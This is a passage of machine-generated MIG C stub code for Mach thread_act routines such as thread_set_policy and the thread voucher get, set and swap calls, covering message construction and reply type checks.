		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_assign_default_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_assign_default_t__defined */

	__DeclareSendRpc(3622, "thread_assign_default")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3622;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3622, "thread_assign_default")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3622, "thread_assign_default")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_assign_default_t__defined)
	check_result = __MIG_check__Reply__thread_assign_default_t((__Reply__thread_assign_default_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_assign_default_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_get_assignment_t__defined)
#define __MIG_check__Reply__thread_get_assignment_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_get_assignment_t(__Reply__thread_get_assignment_t *Out0P)
{

	typedef __Reply__thread_get_assignment_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3723) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->assigned_set.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->assigned_set.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_get_assignment_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_get_assignment */
mig_external kern_return_t thread_get_assignment
(
	thread_inspect_t thread,
	processor_set_name_t *assigned_set
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t assigned_set;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t assigned_set;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_get_assignment_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_get_assignment_t__defined */

	__DeclareSendRpc(3623, "thread_get_assignment")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3623;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3623, "thread_get_assignment")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3623, "thread_get_assignment")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_get_assignment_t__defined)
	check_result = __MIG_check__Reply__thread_get_assignment_t((__Reply__thread_get_assignment_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_get_assignment_t__defined) */

	*assigned_set = Out0P->assigned_set.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_set_policy_t__defined)
#define __MIG_check__Reply__thread_set_policy_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_set_policy_t(__Reply__thread_set_policy_t *Out0P)
{

	typedef __Reply__thread_set_policy_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3724) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_set_policy_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_set_policy */
mig_external kern_return_t thread_set_policy
(
	thread_act_t thr_act,
	processor_set_t pset,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	policy_limit_t limit,
	mach_msg_type_number_t limitCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pset;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		mach_msg_type_number_t limitCnt;
		integer_t limit[1];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__thread_set_policy_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_set_policy_t__defined */

	__DeclareSendRpc(3624, "thread_set_policy")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t psetTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->pset = psetTemplate;
	InP->pset.name = pset;
#else	/* UseStaticTemplates */
	InP->pset.name = pset;
	InP->pset.disposition = 19;
	InP->pset.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->policy = policy;

	if (baseCnt > 5) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->base, (const char *) base, 4 * baseCnt);

	InP->baseCnt = baseCnt;

	msgh_size_delta = (4 * baseCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 24) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 20);

	if (limitCnt > 1) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->limit, (const char *) limit, 4 * limitCnt);

	InP->limitCnt = limitCnt;

	msgh_size += (4 * limitCnt);
	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thr_act;
	InP->Head.msgh_id = 3624;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3624, "thread_set_policy")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3624, "thread_set_policy")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_set_policy_t__defined)
	check_result = __MIG_check__Reply__thread_set_policy_t((__Reply__thread_set_policy_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_set_policy_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_get_mach_voucher_t__defined)
#define __MIG_check__Reply__thread_get_mach_voucher_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_get_mach_voucher_t(__Reply__thread_get_mach_voucher_t *Out0P)
{

	typedef __Reply__thread_get_mach_voucher_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3725) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->voucher.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->voucher.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_get_mach_voucher_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_get_mach_voucher */
mig_external kern_return_t thread_get_mach_voucher
(
	thread_read_t thr_act,
	mach_voucher_selector_t which,
	ipc_voucher_t *voucher
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_voucher_selector_t which;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_get_mach_voucher_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_get_mach_voucher_t__defined */

	__DeclareSendRpc(3625, "thread_get_mach_voucher")

	InP->NDR = NDR_record;

	InP->which = which;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thr_act;
	InP->Head.msgh_id = 3625;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3625, "thread_get_mach_voucher")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3625, "thread_get_mach_voucher")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_get_mach_voucher_t__defined)
	check_result = __MIG_check__Reply__thread_get_mach_voucher_t((__Reply__thread_get_mach_voucher_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_get_mach_voucher_t__defined) */

	*voucher = Out0P->voucher.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_set_mach_voucher_t__defined)
#define __MIG_check__Reply__thread_set_mach_voucher_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_set_mach_voucher_t(__Reply__thread_set_mach_voucher_t *Out0P)
{

	typedef __Reply__thread_set_mach_voucher_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3726) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_set_mach_voucher_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_set_mach_voucher */
mig_external kern_return_t thread_set_mach_voucher
(
	thread_act_t thr_act,
	ipc_voucher_t voucher
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_set_mach_voucher_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_set_mach_voucher_t__defined */

	__DeclareSendRpc(3626, "thread_set_mach_voucher")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t voucherTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->voucher = voucherTemplate;
	InP->voucher.name = voucher;
#else	/* UseStaticTemplates */
	InP->voucher.name = voucher;
	InP->voucher.disposition = 19;
	InP->voucher.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thr_act;
	InP->Head.msgh_id = 3626;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3626, "thread_set_mach_voucher")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3626, "thread_set_mach_voucher")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_set_mach_voucher_t__defined)
	check_result = __MIG_check__Reply__thread_set_mach_voucher_t((__Reply__thread_set_mach_voucher_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_set_mach_voucher_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_swap_mach_voucher_t__defined)
#define __MIG_check__Reply__thread_swap_mach_voucher_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_swap_mach_voucher_t(__Reply__thread_swap_mach_voucher_t *Out0P)
{

	typedef __Reply__thread_swap_mach_voucher_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3727) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->old_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->old_voucher.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_swap_mach_voucher_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_swap_mach_voucher */
mig_external kern_return_t thread_swap_mach_voucher
(
	thread_act_t thr_act,
	ipc_voucher_t new_voucher,
	ipc_voucher_t *old_voucher
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_voucher;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_swap_mach_voucher_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_swap_mach_voucher_t__defined */

	__DeclareSendRpc(3627, "thread_swap_mach_voucher")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_voucherTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t old_voucherTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 2;
#if	UseStaticTemplates
	InP->new_voucher = new_voucherTemplate;
	InP->new_voucher.name = new_voucher;
#else	/* UseStaticTemplates */
	InP->new_voucher.name = new_voucher;
	InP->new_voucher.disposition = 19;
	InP->new_voucher.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	InP->old_voucher = old_voucherTemplate;
	InP->old_voucher.name = *old_voucher;
#else	/* UseStaticTemplates */
	InP->old_voucher.name = *old_voucher;
	InP->old_voucher.disposition = 19;
	InP->old_voucher.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thr_act;
	InP->Head.msgh_id = 3627;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3627, "thread_swap_mach_voucher")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3627, "thread_swap_mach_voucher")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_swap_mach_voucher_t__defined)
	check_result = __MIG_check__Reply__thread_swap_mach_voucher_t((__Reply__thread_swap_mach_voucher_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_swap_mach_voucher_t__defined) */

